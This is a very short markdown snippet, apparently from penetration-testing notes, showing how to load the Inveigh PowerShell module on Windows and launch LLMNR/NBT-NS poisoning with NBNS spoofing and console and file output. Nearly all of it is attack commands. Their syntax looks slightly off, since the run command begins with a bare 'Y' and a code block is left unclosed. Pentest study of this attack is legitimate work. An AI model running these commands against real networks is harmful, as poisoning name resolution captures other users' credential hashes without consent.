# LLMNR/NBT-NS Poisoning Example - from Windows w/ Inveigh


```powershell
PS C:\xxx> Import-Module .\Inveigh.ps1
PS C:\xxx> (Get-Command Invoke-Inveigh).Parameters
...
```powershell
PS C:\xxx> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
